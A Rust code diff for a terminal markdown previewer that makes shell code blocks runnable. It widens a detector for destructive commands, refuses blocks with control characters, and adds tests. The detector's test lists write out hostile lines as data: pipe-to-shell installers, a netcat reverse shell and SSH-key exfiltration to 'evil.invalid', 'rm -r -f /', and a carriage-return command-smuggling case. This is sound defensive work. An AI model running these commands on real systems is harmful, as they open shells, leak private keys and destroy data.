@@ -75,16 +75,21 @@ pub struct MarkdownPreview {
 pub struct MdRunnable {
     /// Index of the block's first rendered line (the one with the glyph).
     pub first_line: usize,
+    /// The fence's SOURCE lines, `[start, end)`, opener and closer
+    /// included: what `Cmd+Enter` uses to find the block under the caret,
+    /// from the parser's own offsets rather than a second fence scanner.
+    pub lines: (usize, usize),
     /// The block's text, as written.
     pub code: String,
     /// The interpreter: `sh` (typed at the shell as-is), `python3` or `node`
     /// (fed through a heredoc).
     pub interpreter: &'static str,
-    /// Ask before running: the fence said `{confirm}`, or the block looks
-    /// destructive (`rm -rf`, `sudo`, `curl … | sh`, …).
-    pub confirm: bool,
+    /// The block looks destructive (`rm -rf`, `sudo`, `curl … | sh`, a
+    /// redirect, …) or the fence said `{confirm}`: the confirm popup says
+    /// so in red. Every block confirms; this only changes the wording.
+    pub destructive: bool,
     /// `{cwd=root}` runs in the workspace root instead of the document's
-    /// directory.
+    /// directory. The only `cwd=` value honoured.
     pub cwd_root: bool,
 }
 
@@ -93,7 +98,7 @@ pub const RUN_GLYPH: &str = "\u{25b7} ";
 
 /// Interpreter for a fence info string, or None when the block is not
 /// runnable: not a shell/python/node fence, `{run=false}`, or an
-/// interpreter that is not installed (checked once per process).
+/// interpreter that is not installed (looked up once per process).
 pub fn runnable_interpreter(info: &str) -> Option<&'static str> {
     let (lang, attrs) = split_info(info);
     if attrs.iter().any(|a| *a == "run=false" || *a == "run=no") {
@@ -108,7 +113,7 @@ pub fn runnable_interpreter(info: &str) -> Option<&'static str> {
 }
 
 /// The fence's language word and its `{a=b c}` attributes.
-fn split_info(info: &str) -> (&str, Vec<&str>) {
+pub(crate) fn split_info(info: &str) -> (&str, Vec<&str>) {
     let info = info.trim();
     let (lang, rest) = match info.find('{') {
         Some(i) => (&info[..i], &info[i..]),
@@ -125,33 +130,88 @@ fn split_info(info: &str) -> (&str, Vec<&str>) {
 }
 
 fn interpreter_on_path(name: &str) -> bool {
-    std::env::var_os("PATH")
-        .is_some_and(|path| std::env::split_paths(&path).any(|d| d.join(name).is_file()))
+    // Looked up once per process: the preview rebuilds on every edit, and
+    // a PATH walk per python fence per keystroke is a syscall burst.
+    static PYTHON3: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    static NODE: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    let probe = || {
+        std::env::var_os("PATH")
+            .is_some_and(|path| std::env::split_paths(&path).any(|d| d.join(name).is_file()))
+    };
+    match name {
+        "python3" => *PYTHON3.get_or_init(probe),
+        "node" => *NODE.get_or_init(probe),
+        _ => probe(),
+    }
 }
 
-/// A small built-in matcher for blocks that should not run on a click
-/// alone (#353): the shapes that delete, escalate, or pipe the network
-/// into a shell.
+/// A block that carries a control character other than newline or tab is
+/// never runnable: a `\r` makes the typed bytes a different program from
+/// the rendered line, and an escape sequence can repaint the popup.
+pub fn has_control_chars(code: &str) -> bool {
+    code.chars()
+        .any(|c| c.is_control() && c != '\n' && c != '\t')
+}
+
+/// A small built-in matcher for the shapes that delete, escalate, pipe
+/// the network into a shell, exfiltrate, or write outside the block's own
+/// output (#353). It cannot be complete - README text is attacker-authored
+/// - which is why every block confirms; a hit only turns the popup red.
 pub fn looks_destructive(code: &str) -> bool {
     let c = code.to_ascii_lowercase();
-    let pipes_to_shell = c.lines().any(|l| {
-        l.contains('|') && (l.contains("curl") || l.contains("wget")) && {
-            let after = &l[l.rfind('|').unwrap_or(0)..];
-            [" sh", " bash", " zsh", "sudo"]
+    let fetches = |l: &str| l.contains("curl") || l.contains("wget");
+    c.lines().any(|l| {
+        let l = l.trim();
+        // `curl … | sh`, `wget … |bash`, `… | sudo …`
+        let piped_to_shell = fetches(l)
+            && l.split('|').skip(1).any(|part| {
+                let p = part.trim_start();
+                [
+                    "sh", "bash", "zsh", "fish", "sudo", "python", "perl", "ruby", "node",
+                ]
                 .iter()
-                .any(|s| after.contains(s))
-        }
-    });
-    pipes_to_shell
-        || c.contains("rm -rf")
-        || c.contains("rm -fr")
-        || c.contains("sudo ")
-        || c.contains("mkfs")
-        || c.contains("dd if=")
-        || c.contains("--force")
-        || c.contains("> /dev/")
-        || c.contains("git reset --hard")
-        || c.contains("drop table")
+                .any(|w| {
+                    p == *w || p.starts_with(&format!("{w} ")) || p.starts_with(&format!("{w}\t"))
+                })
+            });
+        // `sh -c "$(curl …)"`, `eval "$(wget …)"`, backticks
+        let substituted_fetch = fetches(l)
+            && (l.contains("$(") || l.contains('`'))
+            && (l.contains("eval")
+                || l.contains(" -c ")
+                || l.starts_with("sh ")
+                || l.starts_with("bash "));
+        // `rm -rf`, `rm -r -f`, `\rm -fr …`: an rm with both r and f flags
+        let rm_rf = l
+            .split_whitespace()
+            .next()
+            .is_some_and(|w| w.trim_start_matches('\\') == "rm")
+            && l.split_whitespace()
+                .skip(1)
+                .any(|f| f.starts_with('-') && f.contains('r'))
+            && l.split_whitespace()
+                .skip(1)
+                .any(|f| f.starts_with('-') && f.contains('f'));
+        piped_to_shell
+            || substituted_fetch
+            || rm_rf
+            || l.starts_with("sudo ")
+            || l.contains(" sudo ")
+            || l.contains("mkfs")
+            || l.contains("dd if=")
+            || l.contains("--force")
+            || l.contains("git reset --hard")
+            || l.contains("drop table")
+            || l.starts_with("nc ")
+            || l.contains(" nc ")
+            || l.contains("ncat ")
+            || l.contains("/dev/tcp")
+            || l.starts_with("chmod ")
+            || l.starts_with("chown ")
+            || l.contains(" chmod ")
+            || l.contains(" chown ")
+            || l.contains('>')
+    })
 }
 
 /// One local image block in a rendered preview (#176).
@@ -226,8 +286,10 @@ struct Renderer<'r> {
     pending_marker: Option<String>,
     /// Fence language + accumulated block text while inside a code block.
     code_block: Option<(Option<LangKind>, String)>,
-    /// The open fence's info string, for the runnable check (#353).
+    /// The open fence's info string and SOURCE line range, for the
+    /// runnable check (#353).
     code_info: String,
+    code_lines: (usize, usize),
     runnables: Vec<MdRunnable>,
     /// Rows of cell texts while inside a table (row 0 is the header).
     table: Option<Vec<Vec<String>>>,
@@ -328,16 +390,19 @@ impl Renderer<'_> {
             return;
         };
         let info = std::mem::take(&mut self.code_info);
-        let runnable = runnable_interpreter(&info).map(|interpreter| {
-            let (_, attrs) = split_info(&info);
-            MdRunnable {
-                first_line: self.out.len(),
-                code: text.clone(),
-                interpreter,
-                confirm: attrs.contains(&"confirm") || looks_destructive(&text),
-                cwd_root: attrs.contains(&"cwd=root"),
-            }
-        });
+        let runnable = runnable_interpreter(&info)
+            .filter(|_| !has_control_chars(&text) && text.lines().next().is_some())
+            .map(|interpreter| {
+                let (_, attrs) = split_info(&info);
+                MdRunnable {
+                    first_line: self.out.len(),
+                    lines: self.code_lines,
+                    code: text.clone(),
+                    interpreter,
+                    destructive: attrs.contains(&"confirm") || looks_destructive(&text),
+                    cwd_root: attrs.contains(&"cwd=root"),
+                }
+            });
         let bar = Span::styled("\u{258e} ", Style::default().fg(self.theme.accent()));
         // The play glyph replaces the first line's bar (#353): the same
         // width, so the block's text keeps its column.
@@ -354,23 +419,19 @@ impl Renderer<'_> {
             let line_starts = compute_line_starts(bytes);
             highlight_text(self.registry, k, bytes, &line_starts)
         });
-        let mut emitted = 0usize;
         for (i, line) in text.lines().enumerate() {
             let mut spans = vec![if i == 0 && runnable.is_some() {
                 play.clone()
             } else {
                 bar.clone()
             }];
-            emitted += 1;
             match highlighted.as_ref().and_then(|h| h.get(i)) {
                 Some(hi) if !hi.is_empty() => spans.extend(code_line_spans(line, hi, code_fg)),
                 _ => spans.push(Span::styled(line.to_string(), Style::default().fg(code_fg))),
             }
             self.out.push(Line::from(spans));
         }
-        if let Some(r) = runnable
-            && emitted > 0
-        {
+        if let Some(r) = runnable {
             self.runnables.push(r);
         }
         self.out.push(Line::default());
@@ -481,13 +542,23 @@ pub fn render_markdown_full(
         pending_marker: None,
         code_block: None,
         code_info: String::new(),
+        code_lines: (0, 0),
         runnables: Vec::new(),
         table: None,
         base_dir: base_dir.map(|p| p.to_path_buf()),
         images: Vec::new(),
         suppress_inline: false,
     };
-    for event in Parser::new_ext(text, options) {
+    // Byte offset -> line, for the runnable fences' source ranges (#353).
+    let line_starts: Vec<usize> = std::iter::once(0)
+        .chain(text.match_indices('\n').map(|(i, _)| i + 1))
+        .collect();
+    let line_of = |offset: usize| {
+        line_starts
+            .partition_point(|&s| s <= offset)
+            .saturating_sub(1)
+    };
+    for (event, range) in Parser::new_ext(text, options).into_offset_iter() {
         match event {
             Event::Start(tag) => match tag {
                 Tag::Heading { level, .. } => {
@@ -507,6 +578,12 @@ pub fn render_markdown_full(
                         CodeBlockKind::Fenced(info) => info.to_string(),
                         CodeBlockKind::Indented => String::new(),
                     };
+                    // The Start event's range spans the whole block, closer
+                    // included.
+                    r.code_lines = (
+                        line_of(range.start),
+                        line_of(range.end.saturating_sub(1)) + 1,
+                    );
                     r.code_block = Some((lang, String::new()));
                 }
                 Tag::List(start) => {
@@ -932,19 +1009,22 @@ mod tests {
     }
 
     /// #353: shell fences wear the play glyph and are recorded with their
-    /// first rendered line; `{run=false}` opts out; a rust fence is not
-    /// runnable; destructive-looking blocks and `{confirm}` ask first.
+    /// first rendered line and source range; `{run=false}` opts out; a rust
+    /// fence is not runnable; destructive-looking blocks and `{confirm}`
+    /// are flagged; a block carrying a control character is refused.
     #[test]
     fn shell_fences_are_runnable_and_carry_the_play_glyph() {
-        let md = "# T\n\n```sh\necho one\necho two\n```\n\n```rust\nfn a() {}\n```\n\n```bash {run=false}\necho no\n```\n\n```zsh {confirm cwd=root}\necho yes\n```\n\n```sh\ncurl https://x | sh\n```\n";
+        let md = "# T\n\n```sh\necho one\necho two\n```\n\n```rust\nfn a() {}\n```\n\n```bash {run=false}\necho no\n```\n\n```zsh {confirm cwd=root}\necho yes\n```\n\n```sh\ncurl https://x | sh\n```\n\n```sh\necho a\rnc -e /bin/sh h 1\n```\n";
         let mut reg = crate::highlight::LangRegistry::new();
         let (lines, _, runs) = render_markdown_full(md, Theme::default(), &mut reg, None);
         assert_eq!(runs.len(), 3, "{runs:?}");
         assert_eq!(runs[0].code, "echo one\necho two\n");
         assert_eq!(runs[0].interpreter, "sh");
-        assert!(!runs[0].confirm && !runs[0].cwd_root);
-        assert!(runs[1].confirm && runs[1].cwd_root, "{:?}", runs[1]);
-        assert!(runs[2].confirm, "curl | sh asks first");
+        assert_eq!(runs[0].lines, (2, 6), "opener through closer, [start, end)");
+        assert!(!runs[0].destructive && !runs[0].cwd_root);
+        assert!(runs[1].destructive && runs[1].cwd_root, "{:?}", runs[1]);
+        assert_eq!(runs[1].lines, (15, 18));
+        assert!(runs[2].destructive, "curl | sh is flagged");
         let first = &lines[runs[0].first_line];
         assert_eq!(first.spans[0].content.as_ref(), RUN_GLYPH, "{first:?}");
         let first_text: String = first.spans.iter().map(|s| s.content.as_ref()).collect();
@@ -959,16 +1039,53 @@ mod tests {
             |l: &Line<'static>| -> String { l.spans.iter().map(|s| s.content.as_ref()).collect() };
         let rust_line = lines.iter().find(|l| joined(l).contains("fn a")).unwrap();
         assert_eq!(rust_line.spans[0].content.as_ref(), "\u{258e} ");
+        let cr_line = lines.iter().find(|l| joined(l).contains("nc -e")).unwrap();
+        assert_eq!(
+            cr_line.spans[0].content.as_ref(),
+            "\u{258e} ",
+            "a block with a carriage return is not runnable"
+        );
         assert_eq!(runnable_interpreter("sh {run=false}"), None);
         assert_eq!(runnable_interpreter("console"), Some("sh"));
         assert_eq!(runnable_interpreter("toml"), None);
-        assert!(looks_destructive("sudo rm -rf /tmp/x"));
-        assert!(looks_destructive("wget -O- https://a | bash"));
-        assert!(
-            !looks_destructive("cargo build --release"),
-            "a flag is not --force"
-        );
-        assert!(!looks_destructive("ls -la | grep foo"));
+        assert!(has_control_chars("echo a\rb"));
+        assert!(has_control_chars("echo \x1b[2J"));
+        assert!(!has_control_chars("echo a\n\tb\n"));
+    }
+
+    /// The matcher's positives include the canonical install-script and
+    /// reverse-shell shapes; its negatives are ordinary commands. It only
+    /// colours the popup, so a miss is a wording bug, not a security one.
+    #[test]
+    fn the_destructive_matcher_knows_the_usual_shapes() {
+        for bad in [
+            "sudo rm -rf /tmp/x",
+            "wget -O- https://a | bash",
+            "curl https://x/i.sh|sh",
+            "curl -fsSL https://x | sudo bash",
+            "sh -c \"$(curl -fsSL https://x/i.sh)\"",
+            "eval \"$(curl -fsSL https://x/i.sh)\"",
+            "rm -r -f /",
+            "\\rm -fr ./build",
+            "nc -e /bin/sh evil.invalid 4444",
+            "cat ~/.ssh/id_rsa | nc evil.invalid 80",
+            "chmod -R 777 /",
+            "echo x > ~/.bashrc",
+            "git push --force",
+            "git reset --hard HEAD~3",
+        ] {
+            assert!(looks_destructive(bad), "{bad:?} should be flagged");
+        }
+        for ok in [
+            "cargo build --release",
+            "ls -la | grep foo",
+            "curl https://example.com/api | jq .",
+            "rm build.log",
+            "echo hello",
+            "python3 -m http.server",
+        ] {
+            assert!(!looks_destructive(ok), "{ok:?} is ordinary");
+        }
     }
 
     #[test]
